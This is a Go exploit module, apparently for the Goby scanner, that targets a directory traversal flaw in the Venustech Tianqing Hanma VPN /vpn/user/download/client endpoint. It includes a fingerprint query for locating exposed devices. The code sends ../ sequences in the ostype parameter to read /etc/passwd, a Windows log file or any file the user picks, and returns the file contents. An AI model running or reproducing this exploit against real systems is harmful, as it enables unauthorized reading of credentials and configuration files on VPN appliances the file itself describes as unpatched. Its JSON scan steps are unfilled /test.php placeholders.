package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Venustech Tianqing Hanma VPN /vpn/user/download/client Directory Traversal Vulnerability",
    "Description": "<p>An arbitrary file reading vulnerability exists in the Venustech Vpn /vpn/user/download/client interface ostype parameter, which can be exploited by an attacker to read sensitive files on the server, including configuration files, saved account passwords, and other sensitive information leading to further attacks.</p>",
    "Product": "venustech-Tianqing-Hanma-VPN",
    "Homepage": "https://www.venustech.com.cn/",
    "DisclosureDate": "2024-07-15",
    "PostTime": "2024-07-17",
    "Author": "zhangjingpei@baimaohui.net",
    "FofaQuery": "body=\"select_auth_method\" && body=\"select_auth_input\"",
    "GobyQuery": "body=\"select_auth_method\" && body=\"select_auth_input\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>There are no detailed solutions available at this time, please check the homepage for updates.</p><p><a href=\"https://www.venustech.com.cn/\">https://www.venustech.com.cn/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Linux",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal",
        "File Read"
    ],
    "VulType": [
        "Directory Traversal",
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.4",
    "Translation": {
        "CN": {
            "Name": "启明星辰天清汉马VPN /vpn/user/download/client 目录遍历漏洞",
            "Product": "启明星辰-天清汉马VPN",
            "Description": "<p>启明星辰天清汉马VPN /vpn/user/download/client 接口 ostype 参数存在任意文件读取漏洞，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>",
            "Recommendation": "<p>⽬前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.venustech.com.cn/\">https://www.venustech.com.cn/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "目录遍历",
                "文件读取"
            ],
            "Tags": [
                "目录遍历",
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Venustech Tianqing Hanma VPN /vpn/user/download/client Directory Traversal Vulnerability",
            "Product": "venustech-Tianqing-Hanma-VPN",
            "Description": "<p>An arbitrary file reading vulnerability exists in the Venustech Vpn /vpn/user/download/client interface ostype parameter, which can be exploited by an attacker to read sensitive files on the server, including configuration files, saved account passwords, and other sensitive information leading to further attacks.<br></p>",
            "Recommendation": "<p>There are no detailed solutions available at this time, please check the homepage for updates.<br></p><p><a href=\"https://www.venustech.com.cn/\">https://www.venustech.com.cn/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "Directory Traversal",
                "File Read"
            ],
            "Tags": [
                "Directory Traversal",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10972"
}`

	postOrGet_fiejjifepu := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/vpn/user/download/client?ostype=../../../../../../.." + fileUrl

		resp, err := setGetRequest(hostInfo, path, map[string]string{})
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/vpn/user/download/client?ostype=../../../../../../.."

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{

				"/etc/passwd":               "root",
				"C:\\Windows\\setupact.log": "Windows",
			}

			// 函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{

				"passwd": {"/etc/passwd", "root"},
			}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Linux"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true

			expResult.Output = resp

			return expResult

		},
	))

}
